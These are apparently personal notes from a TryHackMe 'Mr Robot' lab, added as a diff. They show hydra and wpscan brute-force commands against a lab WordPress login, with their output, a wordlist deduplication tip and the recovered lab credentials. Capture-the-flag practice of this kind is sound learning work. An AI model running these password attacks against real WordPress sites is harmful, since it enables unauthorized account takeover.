@@ -1,0 +1,140 @@
+hydra -L /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic -p test 10.10.82.148  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V
+
+[ATTEMPT] target 10.10.82.148 - login "net" - pass "test" - 30 of 858235 [child 13] (0/0)
+[80][http-post-form] host: 10.10.82.148   login: Elliot   password: test
+[ATTEMPT] target 10.10.82.148 - login "push" - pass "test" - 31 of 858235 [child 14] (0/0)
+[ATTEMPT] target 10.10.82.148 - login "category" - pass "test" - 32 of 858235 [child 15] (0/0)
+[ATTEMPT] target 10.10.82.148 - login "Alderson" - pass "test" - 33 of 858235 [child 2] (0/0)
+
+username = Elliot
+
+
+hydra -l Elliot -P /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic 10.10.82.148  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -V -t 30
+
+
+
+//Today I learnt SORTING AND REMOVING DUPLICATES from your bruteforce dictionaries is vital
+sort fsocity.dic | uniq > fsocity-sorted.dic
+
+OR
+
+cat fsocity.dic | sort -u | uniq > wordlist.dic
+
+
+[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experiencing" - 356 of 6077 [child 54] (0/0)
+[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experiment" - 357 of 6077 [child 52] (0/0)
+[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experimental" - 358 of 6077 [child 57] (0/0)
+[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experince" - 359 of 6077 [child 58] (0/0)
+[80][http-post-form] host: 10.10.245.102   login: Elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+
+
+//Alternatively valid bruteforce for password with wp-scan:
+wpscan --url 10.10.245.102 --wp-content-dir wp-admin --usernames elliot --passwords /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity-sorted.dic 
+
+__          _______   _____
+\ \        / /  __ \ / ____|
+\ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+\ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+\  /\  /  | |     ____) | (__| (_| | | | |
+\/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+WordPress Security Scanner by the WPScan Team
+Version 3.8.17
+
+@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.245.102/ [10.10.245.102]
+[+] Started: Sun Oct 24 22:04:01 2021
+
+Interesting Finding(s):
+
+[+] Headers
+| Interesting Entries:
+|  - Server: Apache
+|  - X-Mod-Pagespeed: 1.9.32.3-4523
+| Found By: Headers (Passive Detection)
+| Confidence: 100%
+
+[+] robots.txt found: http://10.10.245.102/robots.txt
+| Found By: Robots Txt (Aggressive Detection)
+| Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.245.102/xmlrpc.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
+| References:
+|  - http://codex.wordpress.org/XML-RPC_Pingback_API
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] The external WP-Cron seems to be enabled: http://10.10.245.102/wp-cron.php
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 60%
+| References:
+|  - https://www.iplocation.net/defend-wordpress-from-ddos
+|  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+| Found By: Emoji Settings (Passive Detection)
+|  - http://10.10.245.102/4f61287.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+| Confirmed By: Meta Generator (Passive Detection)
+|  - http://10.10.245.102/4f61287.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+| Location: http://10.10.245.102/wp-admin/themes/twentyfifteen/
+| Last Updated: 2021-07-22T00:00:00.000Z
+| [!] The version is out of date, the latest version is 3.0
+| Style URL: http://10.10.245.102/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+| Style Name: Twenty Fifteen
+| Style URI: https://wordpress.org/themes/twentyfifteen/
+| Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+| Author: the WordPress team
+| Author URI: https://wordpress.org/
+|
+| Found By: Css Style In 404 Page (Passive Detection)
+|
+| Version: 1.3 (80% confidence)
+| Found By: Style (Passive Detection)
+|  - http://10.10.245.102/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+Checking Config Backups - Time: 00:00:06 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc Multicall against 1 user/s
+[SUCCESS] - elliot / ER28-0652                                                                                                                                                                                                              
+All Found                                                                                                                                                                                                                                   
+Progress Time: 00:02:02 <================================================================================================                                                                                  > (12 / 22) 54.54%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+| Username: elliot, Password: ER28-0652
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Oct 24 22:06:22 2021
+[+] Requests Done: 206
+[+] Cached Requests: 6
+[+] Data Sent: 50.97 KB
+[+] Data Received: 18.609 MB
+[+] Memory used: 245.754 MB
+[+] Elapsed time: 00:02:21
+
+
+
+
+//So In the end
+Creds:
+Elliot:ER28-0652
